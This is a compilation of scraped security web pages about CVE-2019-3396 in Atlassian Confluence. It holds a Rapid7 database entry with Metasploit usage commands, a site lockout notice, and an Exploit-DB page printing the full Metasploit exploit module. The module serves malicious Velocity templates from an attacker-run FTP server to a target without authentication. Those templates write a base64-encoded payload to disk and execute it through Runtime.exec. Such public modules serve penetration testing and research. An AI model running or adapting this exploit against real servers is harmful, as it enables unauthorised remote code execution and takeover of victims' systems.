=== Content from www.rapid7.com_912ae3dd_20250121_002117.html ===


[![Rapid7 Home](/Areas/Docs/includes/img/r7-nav/Rapid7_logo.svg)](https://www.rapid7.com/)

* Platform
  + TECHNOLOGYThe Rapid7 Command PlatformAI-Powered Cybersecurity Platform[Explore](/platform/)
  + PLATFORM
  + [PlatformELITE TECHNOLOGY](/platform/)
  + [AI-EngineINTELLIGENT TOOLS](/info/ai-hub-page/)
  + [Rapid7 LabsTRUSTED INTELLIGENCE](/research/)
  + SOLUTIONS
  + [Managed Threat CompleteMANAGED XDR](/services/managed-detection-and-response-mdr/)
  + [Surface CommandATTACK SURFACE MANAGEMENT](/products/command/attack-surface-management-asm/)
  + [Exposure CommandEXPOSURE MANAGEMENT](/products/command/exposure-management/)
* [Products](/products/)
  + NEW!Exposure CommandTake Command of Your Attack Surface[Request Demo](/products/command/request-demo/)
  + DETECTION & RESPONSE
  + [Next-Gen SIEMINSIGHTIDR](/products/insightidr/)
  + [Threat IntelligenceTHREAT COMMAND](/products/threat-command/)
  + EXPOSURE MANAGEMENT
  + [Exposure ManagementEXPOSURE COMMAND](/products/command/exposure-management/)
  + [Attack Surface ManagementSURFACE COMMAND](/products/command/attack-surface-management-asm/)
  + [Vulnerability ManagementINSIGHTVM](/products/insightvm/)
  + [Cloud-Native Application ProtectionINSIGHTCLOUDSEC](/products/insightcloudsec/)
  + [Application Security TestingINSIGHTAPPSEC](/products/insightappsec/)
* [Services](/services/)
  + MXDRManaged Threat Complete24x7 MXDR to secure your extended ecosystem[Request Demo](/services/managed-detection-and-response-mdr/demo/)
  + DETECTION & RESPONSE
  + [Managed XDRMANAGED THREAT COMPLETE](/services/managed-detection-and-response-mdr/)
  + [Incident Response ServicesEXPERIENCING A BREACH?](/services/incident-response-customer-escalation/)
  + EXPOSURE MANAGEMENT
  + [Managed Vulnerability ManagementOPTIMIZED RISK ASSESSMENT](/services/managed-services/vulnerability-management/)
  + [Managed Application SecurityMANAGED DAST](/services/managed-services/managed-appsec/)
  + [Continuous Red TeamingVECTOR COMMAND](/services/continuous-red-team-service/)
  + [Penetration Testing ServicesTEST YOUR DEFENSES](/services/security-consulting/penetration-testing-services/)
* Resources
  + NEWThe 2024 Attack Intelligence ReportRead the latest research by Rapid7 Labs[READ NOW](/research/report/2024-attack-intelligence-report/)
  + STAY CURRENT
  + [About Rapid7 LabsMEET THE RESEARCH TEAM](/research/)
  + [Events & WebinarsCATCH US LIVE](/about/events-webcasts/)
  + [Resources LibraryDIVE INTO THE DETAILS](/resources/)
  + [The Rapid7 BlogSTAY UP-TO-DATE](/blog/)
  + [Exploit DatabaseSEARCH THOUSANDS OF CVES](/db/)
  + [Cybersecurity FundamentalsLEARN THE BASICS](/fundamentals/)
  + PRODUCT SUPPORT
  + [Contact SalesTALK TO AN EXPERT](/contact/)
  + [Customer Support PortalCONTACT SUPPORT](/for-customers/)
  + [Product IntegrationsCONNECT EVERYTHING](https://extensions.rapid7.com/)
  + [Product DocumentationPRODUCT AND SERVICES GUIDES](https://docs.rapid7.com/)
  + [Product Release NotesLATEST FEATURES](https://docs.rapid7.com/release-notes/)
  + [Interactive Product ToursTAKE TOUR](/product-tours/)
* [Company](/about/company/)
  + OVERVIEW
  + [About UsOUR STORY](/about/company/)
  + [LeadershipEXECUTIVE TEAM & BOARD](/about/leadership/)
  + [News & Press ReleasesTHE LATEST FROM OUR NEWSROOM](/about/news/)
  + [CareersJOIN RAPID7](https://careers.rapid7.com/)
  + [Our CustomersTheir Success Stories](/customers/)
  + [PartnersRapid7 Partner Ecosystem](/partners/)
  + [InvestorsInvestor Relations](https://investors.rapid7.com/)
  + COMMUNITY & CULTURE
  + [Social GoodOUR COMMITMENT & APPROACH](/about/social-good/)
  + [Rapid7 Cybersecurity FoundationBUILDING THE FUTURE](/about/rapid7-foundation/)
  + [Diversity, Equity & InclusionEMPOWERING PEOPLE](/about/diversity-equity-and-inclusion/)
  + [Open SourceSTRENGTHENING CYBERSECURITY](/open-source/)
  + [Public PolicyENGAGEMENT & ADVOCACY](/about/public-policy/)
  + [Boston BruinsOur Partnership](/about/rapid7-cybersecurity-partner-boston-bruins/)
* [Partners](/partners/)
* en
  + English
  + [日本語](/ja/db/modules/)
* [![](/Areas/Docs/includes/img/r7-nav/icon-lock.svg) Sign In](https://insight.rapid7.com/saml/SSO)
[Contact us](/contact/)[![Rapid7 Home](/Areas/Docs/includes/img/r7-nav/Rapid7_logo.svg)](https://www.rapid7.com/)

* Platform
  + TECHNOLOGYThe Rapid7 Command PlatformAI-Powered Cybersecurity Platform[Explore](/platform/)
  + PLATFORM
  + [PlatformELITE TECHNOLOGY](/platform/)
  + [AI-EngineINTELLIGENT TOOLS](/info/ai-hub-page/)
  + [Rapid7 LabsTRUSTED INTELLIGENCE](/research/)
  + SOLUTIONS
  + [Managed Threat CompleteMANAGED XDR](/services/managed-detection-and-response-mdr/)
  + [Surface CommandATTACK SURFACE MANAGEMENT](/products/command/attack-surface-management-asm/)
  + [Exposure CommandEXPOSURE MANAGEMENT](/products/command/exposure-management/)
* [Products](/products/)
  + NEW!Exposure CommandTake Command of Your Attack Surface[Request Demo](/products/command/request-demo/)
  + DETECTION & RESPONSE
  + [Next-Gen SIEMINSIGHTIDR](/products/insightidr/)
  + [Threat IntelligenceTHREAT COMMAND](/products/threat-command/)
  + EXPOSURE MANAGEMENT
  + [Exposure ManagementEXPOSURE COMMAND](/products/command/exposure-management/)
  + [Attack Surface ManagementSURFACE COMMAND](/products/command/attack-surface-management-asm/)
  + [Vulnerability ManagementINSIGHTVM](/products/insightvm/)
  + [Cloud-Native Application ProtectionINSIGHTCLOUDSEC](/products/insightcloudsec/)
  + [Application Security TestingINSIGHTAPPSEC](/products/insightappsec/)
* [Services](/services/)
  + MXDRManaged Threat Complete24x7 MXDR to secure your extended ecosystem[Request Demo](/services/managed-detection-and-response-mdr/demo/)
  + DETECTION & RESPONSE
  + [Managed XDRMANAGED THREAT COMPLETE](/services/managed-detection-and-response-mdr/)
  + [Incident Response ServicesEXPERIENCING A BREACH?](/services/incident-response-customer-escalation/)
  + EXPOSURE MANAGEMENT
  + [Managed Vulnerability ManagementOPTIMIZED RISK ASSESSMENT](/services/managed-services/vulnerability-management/)
  + [Managed Application SecurityMANAGED DAST](/services/managed-services/managed-appsec/)
  + [Continuous Red TeamingVECTOR COMMAND](/services/continuous-red-team-service/)
  + [Penetration Testing ServicesTEST YOUR DEFENSES](/services/security-consulting/penetration-testing-services/)
* Resources
  + NEWThe 2024 Attack Intelligence ReportRead the latest research by Rapid7 Labs[READ NOW](/research/report/2024-attack-intelligence-report/)
  + STAY CURRENT
  + [About Rapid7 LabsMEET THE RESEARCH TEAM](/research/)
  + [Events & WebinarsCATCH US LIVE](/about/events-webcasts/)
  + [Resources LibraryDIVE INTO THE DETAILS](/resources/)
  + [The Rapid7 BlogSTAY UP-TO-DATE](/blog/)
  + [Exploit DatabaseSEARCH THOUSANDS OF CVES](/db/)
  + [Cybersecurity FundamentalsLEARN THE BASICS](/fundamentals/)
  + PRODUCT SUPPORT
  + [Contact SalesTALK TO AN EXPERT](/contact/)
  + [Customer Support PortalCONTACT SUPPORT](/for-customers/)
  + [Product IntegrationsCONNECT EVERYTHING](https://extensions.rapid7.com/)
  + [Product DocumentationPRODUCT AND SERVICES GUIDES](https://docs.rapid7.com/)
  + [Product Release NotesLATEST FEATURES](https://docs.rapid7.com/release-notes/)
  + [Interactive Product ToursTAKE TOUR](/product-tours/)
* [Company](/about/company/)
  + OVERVIEW
  + [About UsOUR STORY](/about/company/)
  + [LeadershipEXECUTIVE TEAM & BOARD](/about/leadership/)
  + [News & Press ReleasesTHE LATEST FROM OUR NEWSROOM](/about/news/)
  + [CareersJOIN RAPID7](https://careers.rapid7.com/)
  + [Our CustomersTheir Success Stories](/customers/)
  + [PartnersRapid7 Partner Ecosystem](/partners/)
  + [InvestorsInvestor Relations](https://investors.rapid7.com/)
  + COMMUNITY & CULTURE
  + [Social GoodOUR COMMITMENT & APPROACH](/about/social-good/)
  + [Rapid7 Cybersecurity FoundationBUILDING THE FUTURE](/about/rapid7-foundation/)
  + [Diversity, Equity & InclusionEMPOWERING PEOPLE](/about/diversity-equity-and-inclusion/)
  + [Open SourceSTRENGTHENING CYBERSECURITY](/open-source/)
  + [Public PolicyENGAGEMENT & ADVOCACY](/about/public-policy/)
  + [Boston BruinsOur Partnership](/about/rapid7-cybersecurity-partner-boston-bruins/)
* [Partners](/partners/)

* en
  + English
  + [日本語](/ja/db/modules/)
* [![](/Areas/Docs/includes/img/r7-nav/icon-lock.svg)Sign In](https://insight.rapid7.com/saml/SSO)
[![Rapid7 logo](/Areas/Docs/includes/img/r7-nav/Rapid7_logo-short.svg)](https://www.rapid7.com/)

[Contact us](/contact/)

* [Home](/)
* [Vulnerability & Exploit Database](/db/)
* **Modules**

#### Rapid7 Vulnerability & Exploit Database

# Atlassian Confluence Widget Connector Macro Velocity Template Injection

 [Back to Search](https://www.rapid7.com/db/)

### Atlassian Confluence Widget Connector Macro Velocity Template Injection

Disclosed
03/25/2019

Created
04/22/2019

#### Description

Widget Connector Macro is part of Atlassian Confluence Server and Data Center that
allows embed online videos, slideshows, photostreams and more directly into page.
A \_template parameter can be used to inject remote Java code into a Velocity template,
and gain code execution. Authentication is unrequired to exploit this vulnerability.
By default, Java payload will be used because it is cross-platform, but you can also
specify which native payload you want (Linux or Windows).
Confluence before version 6.6.12, from version 6.7.0 before 6.12.3, from version
6.13.0 before 6.13.3 and from version 6.14.0 before 6.14.2 are affected.
This vulnerability was originally discovered by Daniil Dmitriev
https://twitter.com/ddv\_ua.

#### Author(s)

* Daniil Dmitriev
* Dmitry (rrock) Shchannikov

#### Development

* [Source Code](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/http/confluence_widget_connector.rb)
* [History](https://github.com/rapid7/metasploit-framework/commits/master//modules/exploits/multi/http/confluence_widget_connector.rb)

#### Module Options

To display the available options, load the module within the Metasploit console and run the commands 'show options' or 'show advanced':

```
msf > use exploit/multi/http/confluence_widget_connector
msf exploit(confluence_widget_connector) > show targets
    ...targets...
msf exploit(confluence_widget_connector) > set TARGET < target-id >
msf exploit(confluence_widget_connector) > show options
    ...show and set options...
msf exploit(confluence_widget_connector) > exploit
```

### Metasploit

Penetration testing software for offensive security teams.

Key Features

* [Collect and share all the information you need to conduct a successful and efficient penetration test](/products/metasploit/features)
* [Simulate complex attacks against your systems and users](/products/metasploit/features)
* [Test your defenses to make sure they’re ready](/products/metasploit/features)
* [Automate Every Step of Your Penetration Test](/products/metasploit/features)

[Free Metasploit Pro Trial](/try/metasploit-pro/)
[View All Features](/products/metasploit/features/)

Time is precious, so I don’t want to do something manually that I can automate. Leveraging the Metasploit Framework when automating any task keeps us from having to re-create the wheel as we can use the existing libraries and focus our efforts where it matters.

– Jim O’Gorman | President, Offensive Security

;

Search

[BACK TO TOP
![](/includes/img/up-arrow-lightgray.png?width=1200)](#__)

[![Rapid7 logo](/includes/img/Rapid7_logo.svg?width=1200&quality=90)](/)
CUSTOMER SUPPORT
+1-866-390-8113 (Toll Free)
SALES SUPPORT
+1-866-772-7437 (Toll Free)
Need to report an Escalation or a Breach?
[Get Help](/services/incident-response-customer-escalation/)

SOLUTIONS
[The Command Platform](/platform/)
[Exposure Command](/products/command/exposure-management/)
[Managed Threat Complete](/services/managed-detection-and-response-mdr/)

SUPPORT & RESOURCES
[Product Support](https://www.rapid7.com/for-customers/)
[Resource Library](https://www.rapid7.com/resources/)
[Our Customers](https://www.rapid7.com/customers/)
[Events & Webcasts](https://www.rapid7.com/about/events-webcasts/)
[Training & Certification](https://www.rapid7.com/services/training-certification/)
[Cybersecurity Fundamentals](https://www.rapid7.com/fundamentals/)
[Vulnerability & Exploit Database](https://www.rapid7.com/db/)

ABOUT US
[Company](https://www.rapid7.com/about/company/)
[Diversity, Equity, and Inclusion](https://www.rapid7.com/about/diversity-equity-and-inclusion/)
[Leadership](https://www.rapid7.com/about/leadership/)
[News & Press Releases](https://www.rapid7.com/about/news/)
[Public Policy](https://www.rapid7.com/about/public-policy/)
[Open Source](https://www.rapid7.com/open-source/)
[Investors](https://investors.rapid7.com/overview/default.aspx)

CONNECT WITH US
[Contact](https://www.rapid7.com/contact/)
[Blog](https://www.rapid7.com/blog/)
[Support Login](https://insight.rapid7.com/login)
[Careers](https://careers.rapid7.com/careers-home)

© Rapid7
[Legal Terms](/legal/)
  |   [Privacy Policy](/privacy-policy/)
  |   [Export Notice](/export-notice/)
  |   [Trust](/trust/)
  |   Do Not Sell or Share My Personal Information
  |   Cookie Preferences

Contact Us

## Submit your information and we will get in touch with you.

#### Thank you for contacting us.

##### We will be in touch shortly.

![Rapid7 logo](/includes/img/logo-black.png)

### General:

info@rapid7.com

### Sales:

+1-866-772-7437
sales@rapid7.com

### Support:

+1–866–390–8113 (toll free)
support@rapid7.com

### Incident Response:

1-844-727-4347

[More Contact Info](/contact/)



=== Content from packetstormsecurity.com_09ed4ca7_20250121_002114.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.

=== Content from www.exploit-db.com_13ddf897_20250121_002120.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Atlassian Confluence Widget Connector Macro - Velocity Template Injection (Metasploit)

#### EDB-ID:

###### 46731

#### CVE:

###### [2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

**EDB Verified:**

#### Author:

###### [Metasploit](/?author=3211)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2019-04-19

---

**Vulnerable App:**

```
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::FtpServer

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Atlassian Confluence Widget Connector Macro Velocity Template Injection",
      'Description'    => %q{
        Widget Connector Macro is part of Atlassian Confluence Server and Data Center that
        allows embed online videos, slideshows, photostreams and more directly into page.
        A _template parameter can be used to inject remote Java code into a Velocity template,
        and gain code execution. Authentication is unrequired to exploit this vulnerability.
        By default, Java payload will be used because it is cross-platform, but you can also
        specify which native payload you want (Linux or Windows).

        Confluence before version 6.6.12, from version 6.7.0 before 6.12.3, from version
        6.13.0 before 6.13.3 and from version 6.14.0 before 6.14.2 are affected.

        This vulnerability was originally discovered by Daniil Dmitriev
        https://twitter.com/ddv_ua.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Daniil Dmitriev',                # Discovering vulnerability
          'Dmitry (rrock) Shchannikov'      # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2019-3396' ],
          [ 'URL', 'https://confluence.atlassian.com/doc/confluence-security-advisory-2019-03-20-966660264.html' ],
          [ 'URL', 'https://chybeta.github.io/2019/04/06/Analysis-for-【CVE-2019-3396】-SSTI-and-RCE-in-Confluence-Server-via-Widget-Connector/'],
          [ 'URL', 'https://paper.seebug.org/886/']
        ],
      'Targets'        =>
        [
          [ 'Java',    { 'Platform' => 'java',  'Arch' => ARCH_JAVA }],
          [ 'Windows', { 'Platform' => 'win',   'Arch' => ARCH_X86  }],
          [ 'Linux',   { 'Platform' => 'linux', 'Arch' => ARCH_X86  }]
        ],
      'DefaultOptions' =>
        {
          'RPORT' => 8090,
          'SRVPORT' => 8021,
        },
      'Privileged'     => false,
      'DisclosureDate' => 'Mar 25 2019',
      'DefaultTarget'  => 0,
      'Stance'         => Msf::Exploit::Stance::Aggressive
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base to Confluence', '/']),
        OptString.new('TRIGGERURL', [true, 'Url to external video service to trigger vulnerability',
          'https://www.youtube.com/watch?v=dQw4w9WgXcQ'])
      ])
  end

  # Handles ftp RETP command.
  #
  # @param c [Socket] Control connection socket.
  # @param arg [String] RETR argument.
  # @return [void]
  def on_client_command_retr(c, arg)
    vprint_status("FTP download request for #{arg}")
    conn = establish_data_connection(c)
    if(not conn)
      c.put("425 Can't build data connection\r\n")
      return
    end

    c.put("150 Opening BINARY mode data connection for #{arg}\r\n")
    case arg
    when /check\.vm$/
      conn.put(wrap(get_check_vm))
    when /javaprop\.vm$/
      conn.put(wrap(get_javaprop_vm))
    when /upload\.vm$/
      conn.put(wrap(get_upload_vm))
    when /exec\.vm$/
      conn.put(wrap(get_exec_vm))
    else
      conn.put(wrap(get_dummy_vm))
    end
    c.put("226 Transfer complete.\r\n")
    conn.close
  end

  # Handles ftp PASS command to suppress output.
  #
  # @param c [Socket] Control connection socket.
  # @param arg [String] PASS argument.
  # @return [void]
  def on_client_command_pass(c, arg)
    @state[c][:pass] = arg
    vprint_status("#{@state[c][:name]} LOGIN #{@state[c][:user]} / #{@state[c][:pass]}")
    c.put "230 Login OK\r\n"
  end

  # Handles ftp EPSV command to suppress output.
  #
  # @param c [Socket] Control connection socket.
  # @param arg [String] EPSV argument.
  # @return [void]
  def on_client_command_epsv(c, arg)
    vprint_status("#{@state[c][:name]} UNKNOWN 'EPSV #{arg}'")
    c.put("500 'EPSV #{arg}': command not understood.\r\n")
  end

  # Returns a upload template.
  #
  # @return [String]
  def get_upload_vm
    (
      <<~EOF
        $i18n.getClass().forName('java.io.FileOutputStream').getConstructor($i18n.getClass().forName('java.lang.String')).newInstance('#{@fname}').write($i18n.getClass().forName('sun.misc.BASE64Decoder').getConstructor(null).newInstance(null).decodeBuffer('#{@b64}'))
      EOF
    )
  end

  # Returns a command execution template.
  #
  # @return [String]
  def get_exec_vm
    (
      <<~EOF
        $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('#{@command}').waitFor()
      EOF
    )
  end

  # Returns checking template.
  #
  # @return [String]
  def get_check_vm
    (
      <<~EOF
        #{@check_text}
      EOF
    )
  end

  # Returns Java's getting property template.
  #
  # @return [String]
  def get_javaprop_vm
    (
      <<~EOF
        $i18n.getClass().forName('java.lang.System').getMethod('getProperty', $i18n.getClass().forName('java.lang.String')).invoke(null, '#{@prop}').toString()
      EOF
    )
  end

  # Returns dummy template.
  #
  # @return [String]
  def get_dummy_vm
    (
      <<~EOF
      EOF
    )
  end

  # Checks the vulnerability.
  #
  # @return [Array] Check code
  def check
    checkcode = Exploit::CheckCode::Safe
    begin
      # Start the FTP service
      print_status("Starting the FTP server.")
      start_service

      @check_text = Rex::Text.rand_text_alpha(5..10)
      res = inject_template("ftp://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{Rex::Text.rand_text_alpha(5)}check.vm")
      if res && res.body && res.body.include?(@check_text)
        checkcode = Exploit::CheckCode::Vulnerable
      end
    rescue Msf::Exploit::Failed => e
      vprint_error(e.message)
      checkcode = Exploit::CheckCode::Unknown
    end
    checkcode
  end

  # Injects Java code to the template.
  #
  # @param service_url [String] Address of template to injection.
  # @return [void]
  def inject_template(service_url, timeout=20)

    uri  = normalize_uri(target_uri.path, 'rest', 'tinymce', '1', 'macro', 'preview')

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => uri,
      'headers' => {
        'Accept' => '*/*',
        'Origin' => full_uri(vhost_uri: true)
      },
      'ctype'  => 'application/json; charset=UTF-8',
      'data'   => {
                    'contentId' => '1',
                    'macro' => {
                      'name' => 'widget',
                      'body' => '',
                      'params' => {
                        'url' => datastore['TRIGGERURL'],
                        '_template' => service_url
                      }

                    }
                  }.to_json
    }, timeout=timeout)

    unless res
      unless service_url.include?("exec.vm")
        print_warning('Connection timed out in #inject_template')
      end
      return
    end

    if res.body.include? 'widget-error'
      print_error('Failed to inject and execute code:')
    else
      vprint_status("Server response:")
    end

    vprint_line(res.body)

    res
  end

  # Returns a system property for Java.
  #
  # @param prop [String] Name of the property to retrieve.
  # @return [String]
  def get_java_property(prop)
    @prop = prop
    res = inject_template("ftp://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{Rex::Text.rand_text_alpha(5)}javaprop.vm")
    if res && res.body
      return clear_response(res.body)
    end
    ''
  end

  # Returns the target platform.
  #
  # @return [String]
  def get_target_platform
    return get_java_property('os.name')
  end

  # Checks if the target os/platform is compatible with the module target or not.
  #
  # @return [TrueClass] Compatible
  # @return [FalseClass] Not compatible
  def target_platform_compat?(target_platform)
    target.platform.names.each do |n|
      if n.downcase == 'java' || target_platform.downcase.include?(n.downcase)
        return true
      end
    end

    false
  end

  # Returns a temp path from the remote target.
  #
  # @return [String]
  def get_tmp_path
    return get_java_property('java.io.tmpdir')
  end

  # Returns the Java home path used by Confluence.
  #
  # @return [String]
  def get_java_home_path
    return get_java_property('java.home')
  end

  # Returns Java code that can be used to inject to the template in order to copy a file.
  #
  # @note The purpose of this method is to have a file that is not busy, so we can execute it.
  #       It is meant to be used with #get_write_file_code.
  #
  # @param fname [String] The file to copy
  # @param new_fname [String] The new file
  # @return [void]
  def get_dup_file_code(fname, new_fname)
    if fname =~ /^\/[[:print:]]+/
      @command = "cp #{fname} #{new_fname}"
    else
      @command = "cmd.exe /C copy #{fname} #{new_fname}"
    end

    inject_template("ftp://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{Rex::Text.rand_text_alpha(5)}exec.vm")
  end

  # Returns the normalized file path for payload.
  #
  # @return [String]
  def normalize_payload_fname(tmp_path, fname)
    # A quick way to check platform insteaf of actually grabbing os.name in Java system properties.
    if /^\/[[:print:]]+/ === tmp_path
      Rex::FileUtils.normalize_unix_path(tmp_path, fname)
    else
      Rex::FileUtils.normalize_win_path(tmp_path, fname)
    end
  end

  # Exploits the target in Java platform.
  #
  # @return [void]
  def exploit_as_java

    tmp_path = get_tmp_path

    if tmp_path.blank?
      fail_with(Failure::Unknown, 'Unable to get the temp path.')
    end

    @fname    = normalize_payload_fname(tmp_path, "#{Rex::Text.rand_text_alpha(5)}.jar")
    @b64      = Rex::Text.encode_base64(payload.encoded_jar)
    @command   = ''

    java_home = get_java_home_path

    if java_home.blank?
      fail_with(Failure::Unknown, 'Unable to find java home path on the remote machine.')
    else
      vprint_status("Found Java home path: #{java_home}")
    end

    register_files_for_cleanup(@fname)

    if /^\/[[:print:]]+/ === @fname
      normalized_java_path = Rex::FileUtils.normalize_unix_path(java_home, '/bin/java')
      @command = %Q|#{normalized_java_path} -jar #{@fname}|
    else
      normalized_java_path = Rex::FileUtils.normalize_win_path(java_home, '\\bin\\java.exe')
      @fname.gsub!(/Program Files/, 'PROGRA~1')
      @command = %Q|cmd.exe /C "#{normalized_java_path}" -jar #{@fname}|
    end

    print_status("Attempting to upload #{@fname}")
    inject_template("ftp://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{Rex::Text.rand_text_alpha(5)}upload.vm")

    print_status("Attempting to execute #{@fname}")
    inject_template("ftp://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{Rex::Text.rand_text_alpha(5)}exec.vm", timeout=5)
  end

  # Exploits the target in Windows platform.
  #
  # @return [void]
  def exploit_as_windows
    tmp_path = get_tmp_path

    if tmp_path.blank?
      fail_with(Failure::Unknown, 'Unable to get the temp path.')
    end

    @b64      = Rex::Text.encode_base64(generate_payload_exe(code: payload.encoded, arch: target.arch, platform: target.platform))
    @fname    = normalize_payload_fname(tmp_path,"#{Rex::Text.rand_text_alpha(5)}.exe")
    new_fname = normalize_payload_fname(tmp_path,"#{Rex::Text.rand_text_alpha(5)}.exe")
    @fname.gsub!(/Program Files/, 'PROGRA~1')
    new_fname.gsub!(/Program Files/, 'PROGRA~1')
    register_files_for_cleanup(@fname, new_fname)

    print_status("Attempting to upload #{@fname}")
    inject_template("ftp://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{Rex::Text.rand_text_alpha(5)}upload.vm")

    print_status("Attempting to copy payload to #{new_fname}")
    get_dup_file_code(@fname, new_fname)

    print_status("Attempting to execute #{new_fname}")
    @command = new_fname
    inject_template("ftp://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{Rex::Text.rand_text_alpha(5)}exec.vm", timeout=5)
  end

  # Exploits the target in Linux platform.
  #
  # @return [void]
  def exploit_as_linux
    tmp_path = get_tmp_path

    if tmp_path.blank?
      fail_with(Failure::Unknown, 'Unable to get the temp path.')
    end

    @b64      = Rex::Text.encode_base64(generate_payload_exe(code: payload.encoded, arch: target.arch, platform: target.platform))
    @fname    = normalize_payload_fname(tmp_path, Rex::Text.rand_text_alpha(5))
    new_fname = normalize_payload_fname(tmp_path, Rex::Text.rand_text_alpha(6))
    register_files_for_cleanup(@fname, new_fname)

    print_status("Attempting to upload #{@fname}")
    inject_template("ftp://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{Rex::Text.rand_text_alpha(5)}upload.vm")

    @command = "chmod +x #{@fname}"
    inject_template("ftp://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{Rex::Text.rand_text_alpha(5)}exec.vm")

    print_status("Attempting to copy payload to #{new_fname}")
    get_dup_file_code(@fname, new_fname)

    print_status("Attempting to execute #{new_fname}")
    @command = new_fname
    inject_template("ftp://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{Rex::Text.rand_text_alpha(5)}exec.vm", timeout=5)
  end

  def exploit
    @wrap_marker = Rex::Text.rand_text_alpha(5..10)

    # Start the FTP service
    print_status("Starting the FTP server.")
    start_service

    target_platform = get_target_platform
    if target_platform.nil?
      fail_with(Failure::Unreachable, 'Target did not respond to OS check.  Confirm RHOSTS and RPORT, then run "check".')
    else
      print_status("Target being detected as: #{target_platform}")
    end

    unless target_platform_compat?(target_platform)
      fail_with(Failure::BadConfig, 'Selected module target does not match the actual target.')
    end

    case target.name.downcase
    when /java$/
      exploit_as_java
    when /windows$/
      exploit_as_windows
    when /linux$/
      exploit_as_linux
    end
  end

  # Wraps request.
  #
  # @return [String]
  def wrap(string)
    "#{@wrap_marker}\n#{string}#{@wrap_marker}\n"
  end

  # Returns unwrapped response.
  #
  # @return [String]
  def clear_response(string)
    if match = string.match(/#{@wrap_marker}\n(.*)\n#{@wrap_marker}\n/m)
      return match.captures[0]
    end
  end
end

```

**Tags:**
[Metasploit Framework (MSF)](/?tag=3)
[Remote](/?tag=21)

**Advisory/Source:**
[Link](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/multi/http/confluence_widget_connector.rb)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
